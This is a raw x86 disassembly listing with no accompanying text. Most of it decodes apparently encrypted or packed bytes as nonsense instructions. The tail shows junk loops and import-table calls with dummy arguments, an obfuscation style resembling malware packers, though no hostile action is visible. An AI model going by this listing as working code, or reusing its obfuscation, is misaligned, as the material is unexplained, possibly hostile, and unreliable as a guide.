  40992f:	push   ss
  409930:	imul   eax,esi,0xfe397e8a
  409936:	jp     0x4098fb
  409938:	jg     0x40997e
  40993a:	xor    DWORD PTR [eax+eax*2+0x548fd071],ebp
  409941:	jg     0x409922
  409943:	jmp    0x409952
  409945:	(bad)  
  409946:	dec    eax
  409947:	and    edx,DWORD PTR ds:0x15ea2480
  40994d:	aas    
  40994e:	adc    BYTE PTR [edx],cl
  409950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409951:	pop    es
  409952:	out    dx,eax
  409953:	adc    eax,edi
  409955:	inc    eax
  409956:	jo     0x4099b0
  409958:	outs   dx,DWORD PTR ds:[esi]
  409959:	mov    ch,0xc7
  40995b:	(bad)  
  40995d:	ja     0x409941
  40995f:	je     0x409958
  409961:	popf   
  409962:	(bad)  
  409963:	pop    ds
  409964:	sub    ah,bl
  409966:	test   BYTE PTR [ebx],ch
  409968:	or     al,BYTE PTR [ebx]
  40996a:	mov    ah,0x1b
  40996c:	(bad)  
  40996e:	sti    
  40996f:	stc    
  409970:	adc    al,0xb4
  409972:	in     al,0x3a
  409974:	mov    cl,0x3b
  409976:	pop    esp
  409977:	mov    ebp,0xe26d416e
  40997c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40997d:	jmp    0xf750:0xbb666a81
  409984:	es clc 
  409986:	aaa    
  409987:	loop   0x409976
  409989:	mov    cl,0xba
  40998b:	in     al,0x91
  40998d:	enter  0xfb97,0x60
  409991:	push   esi
  409992:	mov    fs,esp
  409994:	inc    edi
  409995:	je     0x409991
  409997:	dec    eax
  409998:	mov    ebx,0x25fdfa46
  40999d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40999e:	pop    ebx
  40999f:	and    al,0x5a
  4099a1:	jecxz  0x409a1c
  4099a3:	ja     0x409965
  4099a5:	rcl    DWORD PTR [ebx+0x68],1
  4099a8:	dec    ebx
  4099a9:	xor    DWORD PTR [esi+eiz*4],esp
  4099ac:	cmp    eax,0xbfc86fac
  4099b2:	mov    ds:0x92cfa948,al
  4099b7:	or     al,0xb2
  4099b9:	fsubr  st(6),st
  4099bb:	int3   
  4099bc:	in     eax,dx
  4099bd:	(bad)  
  4099be:	xchg   ebp,eax
  4099bf:	xchg   ebp,eax
  4099c0:	mov    ecx,0x81f4284d
  4099c5:	or     edi,esi
  4099c7:	(bad)  
  4099c8:	and    al,ch
  4099ca:	imul   ebp,DWORD PTR [edx+0x31],0x62
  4099ce:	lea    ecx,[esi]
  4099d0:	push   0x4e
  4099d2:	int3   
  4099d3:	sbb    eax,0x604677a4
  4099d8:	imul   eax,DWORD PTR [ebx+0x42],0x6db21873
  4099df:	or     esp,ecx
  4099e1:	add    BYTE PTR [edx],0xac
  4099e4:	jb     0x409968
  4099e6:	and    eax,0xc6e37508
  4099eb:	xchg   ebp,eax
  4099ec:	sti    
  4099ed:	xchg   ebp,eax
  4099ee:	xlat   BYTE PTR ds:[ebx]
  4099ef:	add    dl,BYTE PTR [ecx]
  4099f1:	add    al,0xf1
  4099f3:	push   edi
  4099f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099f5:	in     eax,dx
  4099f6:	pop    ebp
  4099f7:	lods   eax,DWORD PTR ds:[esi]
  4099f8:	pop    esp
  4099f9:	imul   edi,DWORD PTR [eax+edx*2+0xb],0x7f
  4099fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099ff:	push   ebx
  409a00:	jl     0x409a00
  409a02:	fsubr  DWORD PTR [eax+edi*8]
  409a05:	mov    dl,BYTE PTR [ebp+0x4f]
  409a08:	(bad)  
  409a09:	jl     0x409a7a
  409a0b:	mov    dh,0xfb
  409a0d:	adc    edi,ecx
  409a0f:	sar    BYTE PTR [edi+0x2],1
  409a12:	mov    edi,0xf08494cb
  409a17:	pop    edx
  409a18:	lods   eax,DWORD PTR ds:[esi]
  409a19:	xor    DWORD PTR [ebp+ebp*8-0x6e77efd9],eax
  409a20:	add    DWORD PTR [edx+0x77],0xffffff8a
  409a24:	xchg   DWORD PTR [ebx+ebp*8-0x41],ebx
  409a28:	pushf  
  409a29:	pop    ss
  409a2a:	add    DWORD PTR [edx+0x247d1cc],esi
  409a30:	dec    edx
  409a31:	arpl   WORD PTR [ebx],dx
  409a33:	das    
  409a34:	pop    ds
  409a35:	xor    al,0x90
  409a37:	cmp    BYTE PTR [ebx+edi*2+0x35983c7],ah
  409a3e:	(bad)  
  409a3f:	neg    DWORD PTR [ebp-0x149e973a]
  409a45:	jno    0x4099da
  409a47:	push   ebp
  409a48:	outs   dx,BYTE PTR ds:[esi]
  409a49:	fadd   st,st(5)
  409a4b:	retf   0xb394
  409a4e:	lahf   
  409a4f:	xchg   edx,eax
  409a50:	cmp    DWORD PTR [edx-0x79d6e737],ebx
  409a56:	cmp    ebx,DWORD PTR [ecx]
  409a58:	mov    ch,0x69
  409a5a:	cwde   
  409a5b:	add    eax,DWORD PTR [edi+0x65]
  409a5e:	cmp    eax,0xfe34f6f0
  409a63:	sbb    ebp,DWORD PTR [esi+0x7f520463]
  409a69:	sbb    DWORD PTR [ecx+0x47],eax
  409a6c:	push   esi
  409a6d:	push   ebp
  409a6e:	push   cs
  409a6f:	push   DWORD PTR [edi]
  409a71:	popa   
  409a72:	and    eax,0x5a1375d7
  409a77:	rol    DWORD PTR [ebx-0x37],1
  409a7a:	pop    ecx
  409a7b:	inc    ebp
  409a7c:	add    BYTE PTR [edi],ah
  409a7e:	std    
  409a7f:	mov    edi,DWORD PTR [ebx+0x503c1936]
  409a85:	or     eax,0x302ad9d7
  409a8a:	pop    esp
  409a8b:	loop   0x409ae7
  409a8d:	jo     0x409a2c
  409a8f:	fild   QWORD PTR [ecx-0x35f1c494]
  409a95:	fwait
  409a96:	or     eax,0x837c80d1
  409a9b:	aaa    
  409a9c:	mov    bh,0x5
  409a9e:	sbb    BYTE PTR [edx+0x5e82bafb],ah
  409aa4:	push   ds
  409aa5:	pop    ecx
  409aa6:	jmp    0x82be1a91
  409aab:	out    dx,eax
  409aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aad:	mov    ch,0x2e
  409aaf:	mov    eax,0x154ad51f
  409ab4:	xchg   edx,eax
  409ab5:	sub    bl,BYTE PTR [esi]
  409ab7:	dec    BYTE PTR [edx+0x195c503a]
  409abd:	stc    
  409abe:	ret    
  409abf:	or     al,0xec
  409ac1:	xor    BYTE PTR [ecx],bh
  409ac3:	jmp    0x65dfa579
  409ac8:	inc    sp
  409aca:	xchg   ebx,eax
  409acb:	inc    DWORD PTR [edi-0x1b928d0a]
  409ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ad2:	mov    edx,0x5dc64715
  409ad7:	adc    DWORD PTR [ebp+0x21],esi
  409ada:	(bad)  
  409adb:	inc    ecx
  409adc:	pushf  
  409add:	mov    edx,edi
  409adf:	mov    DWORD PTR [edi+0x32f49bbf],esp
  409ae5:	les    edx,FWORD PTR [ebp+0x4131f01b]
  409aeb:	in     al,dx
  409aec:	jbe    0x409abb
  409aee:	push   eax
  409aef:	jp     0x409aad
  409af1:	jbe    0x409ab9
  409af3:	imul   ecx,edi,0xcf7adfb2
  409af9:	in     al,0xa3
  409afb:	jecxz  0x409a80
  409afd:	cmp    BYTE PTR [ebp+0x4c],bh
  409b00:	push   eax
  409b01:	stos   DWORD PTR es:[edi],eax
  409b02:	out    dx,eax
  409b03:	mov    DWORD PTR [eax+0x1858ddae],esi
  409b09:	cli    
  409b0a:	add    BYTE PTR [ebx+ebp*2],cl
  409b0d:	ror    BYTE PTR [esi-0x128ce651],0xe0
  409b14:	mov    dl,0xa5
  409b16:	adc    al,0x30
  409b18:	inc    ebp
  409b19:	xchg   edi,eax
  409b1a:	inc    ecx
  409b1b:	mov    bh,0xf5
  409b1d:	fld    TBYTE PTR [edx-0x169879d6]
  409b23:	mov    bl,0x2e
  409b25:	div    DWORD PTR [ecx+0x10]
  409b28:	(bad)  
  409b29:	or     al,0x7f
  409b2b:	pop    ebx
  409b2c:	sub    DWORD PTR [edi],esi
  409b2e:	scas   eax,DWORD PTR es:[edi]
  409b2f:	sub    DWORD PTR [esi-0x36],edx
  409b32:	or     al,0x4b
  409b34:	mov    dl,0x44
  409b36:	cmp    DWORD PTR [eax+edx*1-0x1e08c1d7],edi
  409b3d:	int3   
  409b3e:	dec    eax
  409b3f:	(bad)  
  409b41:	adc    al,0x42
  409b43:	pop    esi
  409b44:	(bad)  
  409b45:	xlat   BYTE PTR ds:[ebx]
  409b46:	mov    edx,0x8cfa7dfa
  409b4b:	pop    edx
  409b4c:	mov    ds:0xbc222234,eax
  409b51:	jo     0x409b44
  409b53:	sub    BYTE PTR [edx+0x1],ah
  409b56:	mov    ebp,0xf2ff4554
  409b5b:	inc    ebp
  409b5c:	dec    edi
  409b5d:	ins    BYTE PTR es:[edi],dx
  409b5e:	sbb    ch,ah
  409b60:	cmc    
  409b61:	mov    eax,0x4b9c8e49
  409b66:	sub    bl,ah
  409b68:	in     al,dx
  409b69:	adc    DWORD PTR ds:0x48fec70,esi
  409b6f:	xor    BYTE PTR [ecx-0x2b],dh
  409b72:	stos   DWORD PTR es:[edi],eax
  409b73:	jl     0x409b3d
  409b75:	xchg   esp,eax
  409b76:	pop    ecx
  409b77:	fidivr DWORD PTR [ebx-0xa]
  409b7a:	mov    eax,ds:0x5c3da78c
  409b7f:	xchg   edi,eax
  409b80:	popa   
  409b81:	int    0x43
  409b83:	mul    DWORD PTR [edi-0x6083e8f9]
  409b89:	jmp    0x409bd0
  409b8b:	das    
  409b8c:	in     al,dx
  409b8d:	daa    
  409b8e:	retw   0xfe07
  409b92:	jmp    0x409b4b
  409b94:	in     eax,dx
  409b95:	sti    
  409b96:	sub    BYTE PTR [ecx-0x21],ch
  409b99:	mov    eax,0x1b78c6c4
  409b9e:	adc    ah,BYTE PTR [eax+0x58]
  409ba1:	mov    bl,BYTE PTR [ebp+0x5f4dd38e]
  409ba7:	or     BYTE PTR [esi-0x386b32ec],bh
  409bad:	or     esi,esi
  409baf:	(bad)  
  409bb0:	neg    DWORD PTR [edi-0x1c2c0182]
  409bb6:	out    0x55,al
  409bb8:	in     eax,0x9c
  409bba:	fs mov bl,0xb
  409bbd:	fcomp  QWORD PTR [edi-0x73239498]
  409bc3:	lahf   
  409bc4:	dec    ecx
  409bc5:	inc    ecx
  409bc6:	dec    eax
  409bc7:	fadd   DWORD PTR [edx+0x1fdffeab]
  409bcd:	ret    
  409bce:	xchg   edi,eax
  409bcf:	sub    ecx,eax
  409bd1:	pop    ds
  409bd2:	mov    cl,0xb2
  409bd4:	push   ecx
  409bd5:	hlt    
  409bd6:	jmp    0x409be3
  409bd8:	xchg   ebp,eax
  409bd9:	outs   dx,BYTE PTR ds:[esi]
  409bda:	mov    ah,0xc1
  409bdc:	mov    DWORD PTR [edi],ebx
  409bde:	add    DWORD PTR [ecx+0x4e],0xec320424
  409be5:	fstp   DWORD PTR [esi]
  409be7:	mov    eax,0xb4196389
  409bec:	xlat   BYTE PTR ds:[ebx]
  409bed:	cmp    eax,0xdd9702
  409bf2:	pop    ecx
  409bf3:	dec    eax
  409bf4:	mov    WORD PTR [eax+ecx*1+0xd40fb9e],es
  409bfb:	dec    esp
  409bfc:	cwde   
  409bfd:	lock cmp BYTE PTR [eax+0x3a],ah
  409c01:	pop    esp
  409c02:	jecxz  0x409c61
  409c04:	sahf   
  409c05:	push   esp
  409c06:	sar    DWORD PTR [ecx+0x4],cl
  409c09:	inc    edx
  409c0a:	ins    BYTE PTR es:[edi],dx
  409c0b:	fnsave [ebx+0x3f28193f]
  409c11:	dec    bh
  409c13:	or     eax,0xcabb681d
  409c18:	push   ebp
  409c19:	mov    ds:0x6fe097c7,eax
  409c1e:	sub    eax,0x729b38a0
  409c23:	push   esi
  409c24:	fcom   DWORD PTR [ecx-0x5f]
  409c27:	xor    BYTE PTR [eax+0x15de4d9],bl
  409c2d:	add    al,0x4d
  409c2f:	xchg   ecx,eax
  409c30:	xchg   DWORD PTR [edi+0x31],esp
  409c33:	pop    ds
  409c34:	and    al,0xde
  409c36:	xchg   ecx,eax
  409c37:	mov    ds:0x7fac925e,al
  409c3c:	add    eax,0xdc6c29e2
  409c41:	dec    esp
  409c42:	popa   
  409c43:	lock jge 0x409c83
  409c46:	cld    
  409c47:	arpl   si,bp
  409c49:	sbb    eax,0xb137b371
  409c4e:	mov    bl,0xba
  409c50:	call   0x3ab30fac
  409c55:	xchg   esp,eax
  409c56:	jb     0x409c79
  409c58:	test   al,0x1b
  409c5a:	and    al,0x8e
  409c5c:	je     0x409c64
  409c5e:	adc    ebp,ecx
  409c60:	mov    bh,0x75
  409c62:	(bad)  
  409c63:	xchg   esp,eax
  409c64:	sbb    esi,DWORD PTR ds:0x6fe7152e
  409c6a:	out    0xb,eax
  409c6c:	cwde   
  409c6d:	sbb    DWORD PTR [edx],esp
  409c6f:	int3   
  409c70:	gs retf 0xfae8
  409c74:	cmp    al,0x4a
  409c76:	pop    ebp
  409c77:	mov    dh,0xd2
  409c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c7a:	inc    ecx
  409c7b:	cmp    cl,cl
  409c7d:	xor    BYTE PTR [ebp+0x77],dh
  409c80:	adc    al,0x16
  409c82:	lods   eax,DWORD PTR ds:[esi]
  409c83:	pop    DWORD PTR ds:0xb19acc6c
  409c89:	mov    ebp,0x7b742d7e
  409c8e:	add    al,0x82
  409c90:	push   ebp
  409c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c93:	inc    eax
  409c94:	(bad)  
  409c95:	fcom   QWORD PTR [eax-0x79]
  409c98:	adc    dh,al
  409c9a:	push   eax
  409c9b:	in     al,0xda
  409c9d:	push   ebx
  409c9e:	fdivr  st,st(0)
  409ca0:	rol    DWORD PTR [ebp+0xf],0x39
  409ca4:	pop    eax
  409ca5:	cmp    eax,0x15940697
  409caa:	pop    es
  409cab:	cld    
  409cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cad:	leave  
  409cae:	jmp    0x409cec
  409cb0:	cld    
  409cb1:	lods   al,BYTE PTR ds:[esi]
  409cb2:	pushf  
  409cb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cb4:	xchg   DWORD PTR [eax-0x48],edi
  409cb7:	xor    al,0xc1
  409cb9:	div    edx
  409cbb:	int3   
  409cbc:	xor    eax,0xa4cf3345
  409cc1:	mov    dl,0xc8
  409cc3:	mov    bh,0xcd
  409cc5:	les    eax,FWORD PTR [edx-0x4c3ce901]
  409ccb:	dec    esp
  409ccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ccd:	icebp  
  409cce:	push   ebx
  409ccf:	stos   DWORD PTR es:[edi],eax
  409cd0:	fisttp QWORD PTR [ecx]
  409cd2:	test   al,0xab
  409cd4:	jbe    0x409c7d
  409cd6:	jno    0x409cd9
  409cd8:	push   esp
  409cd9:	mov    eax,ds:0x1175c14f
  409cde:	lahf   
  409cdf:	add    BYTE PTR [ecx-0x4b],0x55
  409ce3:	(bad)  
  409ce4:	add    BYTE PTR [esi],ch
  409ce6:	xchg   esi,eax
  409ce7:	aam    0xcd
  409ce9:	lock jnp 0x409cc4
  409cec:	(bad)  
  409ced:	cld    
  409cee:	sbb    esi,DWORD PTR [edi+0x4c]
  409cf1:	aad    0x3f
  409cf3:	nop
  409cf4:	inc    edx
  409cf5:	in     eax,0x5d
  409cf7:	and    DWORD PTR [eax],edx
  409cf9:	sbb    eax,0x543509f4
  409cfe:	(bad)  
  409cff:	dec    edi
  409d00:	(bad)  
  409d01:	jecxz  0x409d5a
  409d03:	jg     0x409d67
  409d05:	xchg   ebx,eax
  409d06:	add    BYTE PTR [ecx],bh
  409d08:	or     bl,BYTE PTR [edi-0x11a0e15d]
  409d0e:	jg     0x409d15
  409d10:	mov    eax,ds:0x695fcee3
  409d15:	call   0xf06ee446
  409d1a:	dec    edx
  409d1b:	(bad)  
  409d1c:	pop    ds
  409d1d:	mov    cl,0xf3
  409d1f:	int    0xa4
  409d21:	aam    0x59
  409d23:	scas   al,BYTE PTR es:[edi]
  409d24:	dec    ebp
  409d25:	hlt    
  409d26:	ins    DWORD PTR es:[edi],dx
  409d27:	addr16 and bh,dl
  409d2a:	cmp    al,0x1e
  409d2c:	jbe    0x409cd3
  409d2e:	ds enter 0x300f,0x81
  409d33:	adc    edx,DWORD PTR [edi+0x19]
  409d36:	push   ss
  409d37:	xchg   ecx,eax
  409d38:	mov    esi,0x796eff3a
  409d3d:	gs es sbb eax,0xd7a85629
  409d44:	mov    dl,0xa2
  409d46:	sub    cl,BYTE PTR [ebx+0x50eb1893]
  409d4c:	ffreep st(5)
  409d4e:	mov    ds:0xc2dc7fa6,al
  409d53:	inc    edx
  409d54:	aad    0x96
  409d56:	inc    edi
  409d57:	aas    
  409d58:	ret    0xaba5
  409d5b:	gs das 
  409d5d:	and    BYTE PTR [edi+0x5],cl
  409d60:	cmp    ecx,DWORD PTR [ebp-0x2bfd6667]
  409d66:	cmp    edx,DWORD PTR [edi-0x79]
  409d69:	cdq    
  409d6a:	imul   ebx,DWORD PTR [ecx+0x51],0x31
  409d6e:	aaa    
  409d6f:	mov    ds:0x3319f6fc,eax
  409d74:	xchg   ebp,ebx
  409d76:	sub    ah,BYTE PTR [edi+0x433217c4]
  409d7c:	retf   0x8a45
  409d7f:	outs   dx,DWORD PTR ds:[esi]
  409d80:	lods   al,BYTE PTR ds:[esi]
  409d81:	adc    DWORD PTR [edx+0x640bcf67],0x7d1dc472
  409d8b:	add    eax,DWORD PTR [esi-0x3ae0d421]
  409d91:	pushf  
  409d92:	sub    ecx,esp
  409d94:	push   es
  409d95:	and    ebp,DWORD PTR [eax]
  409d97:	les    esp,FWORD PTR [ebx]
  409d99:	(bad)  
  409d9a:	out    dx,eax
  409d9b:	mov    dl,BYTE PTR ds:0xee5be8df
  409da1:	xor    cl,ch
  409da3:	fiadd  WORD PTR [ebx+0x58]
  409da6:	loop   0x409d9a
  409da8:	pusha  
  409da9:	cs and DWORD PTR es:[ebx+eax*4+0xe],eax
  409daf:	int3   
  409db0:	pop    ss
  409db1:	int    0xee
  409db3:	sub    eax,0xaa6d2f11
  409db8:	cmp    ah,BYTE PTR [eax+ecx*1]
  409dbb:	js     0x409db6
  409dbd:	sbb    eax,0x63921196
  409dc2:	cwde   
  409dc3:	dec    ebp
  409dc4:	std    
  409dc5:	jp     0x409d64
  409dc7:	inc    eax
  409dc8:	push   edi
  409dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dca:	outs   dx,DWORD PTR ds:[esi]
  409dcb:	loopne 0x409da0
  409dcd:	sbb    DWORD PTR [edx+0x79],ebp
  409dd0:	(bad)  
  409dd1:	sti    
  409dd2:	mov    ebx,0x9dc9c75e
  409dd7:	(bad)  
  409dd8:	fwait
  409dd9:	(bad)  
  409dda:	cmp    DWORD PTR [ebp+esi*4-0x6fa55bb2],ebx
  409de1:	mov    esi,0x7f65cf8f
  409de6:	jo     0x409db6
  409de8:	shl    bl,0x8f
  409deb:	les    esi,FWORD PTR [ebp-0x70362f2c]
  409df1:	pop    ebx
  409df2:	test   DWORD PTR [edi+0x4d],0xaea18ed6
  409df9:	cli    
  409dfa:	sbb    edx,DWORD PTR [ebx+0x5e]
  409dfd:	rcl    edx,1
  409dff:	mov    ds:0xb3fa92ad,eax
  409e04:	mov    eax,0x27793001
  409e09:	push   0xf7f36a45
  409e0e:	jnp    0x409dca
  409e10:	cmp    eax,0xaed11c51
  409e15:	arpl   WORD PTR [esi],dx
  409e17:	in     al,0xca
  409e19:	aas    
  409e1a:	cli    
  409e1b:	add    al,0x5c
  409e1d:	stc    
  409e1e:	mov    ah,0xd3
  409e20:	sub    al,0x45
  409e22:	jns    0x409e09
  409e24:	xor    eax,0xc2fa428c
  409e29:	xchg   esp,eax
  409e2a:	lds    edi,FWORD PTR [ebx+0xda4f3eb]
  409e30:	jns    0x409dee
  409e32:	call   0xd3f6bab5
  409e37:	fcmovu st,st(1)
  409e39:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  409e3b:	sahf   
  409e3c:	lea    ebp,[esp+ecx*1+0x38bb8122]
  409e43:	xchg   DWORD PTR [edi+0x23],edx
  409e46:	sbb    dh,BYTE PTR [edx]
  409e48:	ss pop ebp
  409e4a:	inc    esi
  409e4b:	xlat   BYTE PTR ds:[ebx]
  409e4c:	or     BYTE PTR [edx+ecx*8],bh
  409e4f:	mov    ebx,eax
  409e51:	and    ah,bl
  409e53:	js     0x409e75
  409e55:	les    ebp,FWORD PTR gs:[edx]
  409e58:	and    eax,0x51af8447
  409e5d:	stc    
  409e5e:	cli    
  409e5f:	scas   al,BYTE PTR es:[edi]
  409e60:	jle    0x409e08
  409e62:	jl     0x409ec9
  409e64:	sbb    dl,0xa8
  409e67:	loope  0x409e4e
  409e69:	stos   BYTE PTR es:[edi],al
  409e6a:	or     esp,ebx
  409e6c:	ret    0x896d
  409e6f:	test   al,0xf8
  409e71:	fdivp  st(2),st
  409e73:	pop    ebp
  409e74:	in     eax,0x26
  409e76:	repz data16 sti 
  409e79:	mov    ds:0x56f026bc,eax
  409e7e:	dec    ebx
  409e7f:	ret    
  409e80:	xchg   eax,ebx
  409e82:	sub    eax,0xc7052bf0
  409e87:	imul   ebx,DWORD PTR [esi-0x73ae5214],0xa280e32d
  409e91:	mov    bh,0x9c
  409e93:	(bad)  
  409e94:	sar    dl,1
  409e96:	add    al,0x3
  409e98:	cwd    
  409e9a:	mov    WORD PTR [esi-0x1b1821f4],?
  409ea0:	ss xchg ecx,eax
  409ea2:	and    al,0x59
  409ea4:	or     esp,eax
  409ea6:	or     DWORD PTR [esi],ebp
  409ea8:	or     al,0xd2
  409eaa:	dec    ebp
  409eab:	popa   
  409eac:	sbb    edi,DWORD PTR [eax+0x3ba3a0]
  409eb2:	int    0x80
  409eb4:	adc    BYTE PTR [edx],bh
  409eb6:	ror    ebx,1
  409eb8:	mov    eax,ds:0xd0deafc3
  409ebd:	xor    ah,BYTE PTR [ebp-0x20042daf]
  409ec3:	add    BYTE PTR [edi-0x5f],0xa9
  409ec7:	mov    ss,WORD PTR [edi-0x3bf4b585]
  409ecd:	repz sbb bh,BYTE PTR [ecx+0x12aa56b5]
  409ed4:	inc    ebx
  409ed5:	retf   
  409ed6:	dec    ecx
  409ed7:	sub    esi,DWORD PTR [edx]
  409ed9:	mov    bh,0x12
  409edb:	inc    eax
  409edc:	test   al,0x27
  409ede:	and    al,ch
  409ee0:	mov    al,BYTE PTR [ebx-0x28]
  409ee3:	jmp    0xea84:0xb6fedca0
  409eea:	xor    eax,DWORD PTR [eax-0x27]
  409eed:	pop    eax
  409eee:	call   0x6b4a:0x322f8478
  409ef5:	or     esp,ecx
  409ef7:	cmp    al,0x1f
  409ef9:	ja     0x409eb4
  409efb:	push   ebx
  409efc:	sbb    DWORD PTR [esp+edx*2+0x43868be6],esp
  409f03:	aam    0xae
  409f05:	repnz div ebp
  409f08:	add    eax,0xc07f471f
  409f0d:	cld    
  409f0e:	pop    eax
  409f0f:	aas    
  409f10:	arpl   cx,ax
  409f12:	dec    ecx
  409f13:	sbb    BYTE PTR [esi+0x3bed9c3a],dl
  409f19:	push   0x77954ab5
  409f1e:	mov    dh,BYTE PTR ds:0xfca4d86e
  409f24:	pop    esi
  409f25:	xchg   ebx,eax
  409f26:	push   eax
  409f27:	sbb    al,0x25
  409f29:	ror    BYTE PTR [ebx-0x6d020653],1
  409f2f:	psubw  mm0,mm0
  409f32:	les    esp,FWORD PTR [esp+esi*8+0x3f]
  409f36:	jge    0x409f4e
  409f38:	in     eax,0x34
  409f3a:	lds    edx,FWORD PTR [edx+0x47]
  409f3d:	test   BYTE PTR [edi-0x3fefc0e8],ch
  409f43:	mov    dl,0xa1
  409f45:	mov    fs,WORD PTR [edi+0x7ababffc]
  409f4b:	jmp    0x6ad7:0xb038f0c8
  409f52:	pop    ds
  409f53:	scas   eax,DWORD PTR es:[edi]
  409f54:	xor    eax,0xa8eb8101
  409f59:	ss xlat BYTE PTR ss:[ebx]
  409f5c:	(bad)  
  409f5d:	fld    TBYTE PTR [ebx-0x165b53f]
  409f63:	in     eax,dx
  409f64:	shl    DWORD PTR ds:[edi+0x5bf104ae],1
  409f6b:	xchg   BYTE PTR [ebx],dh
  409f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f6e:	add    BYTE PTR [esi+0x5f],0xd3
  409f72:	adc    ebx,DWORD PTR [ebx+0x38130e93]
  409f78:	loope  0x409f50
  409f7a:	imul   edx,DWORD PTR [ecx+0x9cc7c48],0x67
  409f81:	mov    eax,DWORD PTR [eax+0x198]
  409f87:	and    DWORD PTR ds:0x429008,0x0
  409f91:	xor    edx,edx
  409f93:	add    edx,DWORD PTR ds:0x429008
  409f99:	inc    edx
  409f9a:	mov    DWORD PTR ds:0x429008,edx
  409fa0:	cmp    DWORD PTR ds:0x429008,0x11
  409fa7:	jne    0x409fe0
  409fad:	push   DWORD PTR [ebp-0x28]
  409fb0:	push   DWORD PTR [ebp-0xc]
  409fb3:	push   0x130f
  409fb8:	push   0x751a
  409fbd:	push   0x8a1e
  409fc2:	push   0x2320
  409fc7:	push   DWORD PTR [ebp-0x24]
  409fca:	push   0x206d
  409fcf:	push   DWORD PTR [ebp-0xc]
  409fd2:	push   DWORD PTR [ebp-0x20]
  409fd5:	push   0x5142
  409fda:	call   DWORD PTR ds:0x42e8db
  409fe0:	cmp    DWORD PTR ds:0x429008,0x10
  409fe7:	jne    0x409ffa
  409fed:	mov    edx,DWORD PTR ds:0x429008
  409ff3:	inc    edx
  409ff4:	mov    DWORD PTR ds:0x429008,edx
  409ffa:	cmp    DWORD PTR ds:0x429008,0x1e
  40a001:	jb     0x409f91
  40a007:	xor    edi,ecx
  40a009:	add    DWORD PTR ds:0x42d000,ebx
  40a00f:	mov    edx,0x3272e2
  40a014:	mov    DWORD PTR ds:0x42c010,0x65c3
  40a01e:	add    edi,edx
  40a020:	cmp    DWORD PTR [eax],edi
  40a022:	mov    DWORD PTR ds:0x42a00c,0xde
  40a02c:	je     0x40a043
  40a032:	mov    eax,DWORD PTR [eax]
  40a034:	mov    DWORD PTR ds:0x42c004,0x3704
  40a03e:	jmp    0x40ea3f
  40a043:	mov    eax,ds:0x42b010
  40a048:	mov    eax,DWORD PTR [ebp+0x18]
  40a04b:	cmp    eax,esi
  40a04d:	mov    DWORD PTR ds:0x42a00c,0x4db6
  40a057:	jne    0x40a071
  40a05d:	mov    DWORD PTR ds:0x42c008,0x3d03
  40a067:	push   0xf89c8584
  40a06c:	jmp    0x40ea2e
  40a071:	mov    esi,DWORD PTR [ebp+0x18]
  40a074:	mov    eax,0xf89c85bb
  40a079:	cmp    esi,eax
  40a07b:	mov    DWORD PTR ds:0x42b008,0x1a7e
  40a085:	jne    0x40ea1e
  40a08b:	sbb    eax,esi
  40a08d:	mov    eax,DWORD PTR [ebp+0x10]
  40a090:	and    DWORD PTR ds:0x42c010,0x0
  40a09a:	mov    esi,DWORD PTR ds:0x42c010
  40a0a0:	inc    esi
  40a0a1:	mov    DWORD PTR ds:0x42c010,esi
  40a0a7:	cmp    DWORD PTR ds:0x42c010,0x1f
  40a0ae:	jne    0x40a0cf
  40a0b4:	push   0x2683
  40a0b9:	push   DWORD PTR [ebp-0x20]
  40a0bc:	push   0x3e9b
  40a0c1:	push   DWORD PTR [ebp-0x20]
  40a0c4:	push   0x63df
  40a0c9:	call   DWORD PTR ds:0x42e8df
  40a0cf:	cmp    DWORD PTR ds:0x42c010,0x13
  40a0d6:	jb     0x40a09a
  40a0dc:	mov    DWORD PTR ds:0x42c008,0x14
  40a0e6:	cmp    DWORD PTR ds:0x42c008,0x0
  40a0ed:	je     0x40a126
  40a0f3:	cmp    DWORD PTR ds:0x42c008,0x1c
  40a0fa:	jne    0x40a106
  40a100:	call   DWORD PTR ds:0x42e91b
  40a106:	xor    esi,esi
  40a108:	xor    esi,DWORD PTR ds:0x42c008
  40a10e:	dec    esi
  40a10f:	mov    DWORD PTR ds:0x42c008,esi
  40a115:	jmp    0x40a0e6
  40a11a:	mov    esi,DWORD PTR ds:0x42901c
  40a120:	or     DWORD PTR ds:0x429020,esi
  40a126:	xor    eax,ecx
  40a128:	and    esi,DWORD PTR ds:0x42c018
  40a12e:	add    eax,edx
  40a130:	and    DWORD PTR ds:0x42c004,0x0
  40a13a:	xor    esi,esi
  40a13c:	add    esi,DWORD PTR ds:0x42c004
  40a142:	inc    esi
  40a143:	mov    DWORD PTR ds:0x42c004,esi
  40a149:	cmp    DWORD PTR ds:0x42c004,0xd
  40a150:	jne    0x40a164
  40a156:	push   0x6b46
  40a15b:	push   DWORD PTR [ebp-0x10]
  40a15e:	call   DWORD PTR ds:0x42e91f
  40a164:	cmp    DWORD PTR ds:0x42c004,0xc
  40a16b:	jne    0x40a180
  40a171:	xor    esi,esi
  40a173:	xor    esi,DWORD PTR ds:0x42c004
  40a179:	inc    esi
  40a17a:	mov    DWORD PTR ds:0x42c004,esi
  40a180:	cmp    DWORD PTR ds:0x42c004,0x1b
  40a187:	jb     0x40a13a
  40a18d:	xor    esi,esi
  40a18f:	xor    esi,DWORD PTR ds:0x42c010
  40a195:	or     esi,DWORD PTR ds:0x429000
  40a19b:	mov    DWORD PTR ds:0x42c010,esi
  40a1a1:	mov    DWORD PTR [ebp-0x18],eax
  40a1a4:	mov    eax,DWORD PTR [ebp+0xc]
  40a1a7:	mov    esi,DWORD PTR [ebp-0x8]
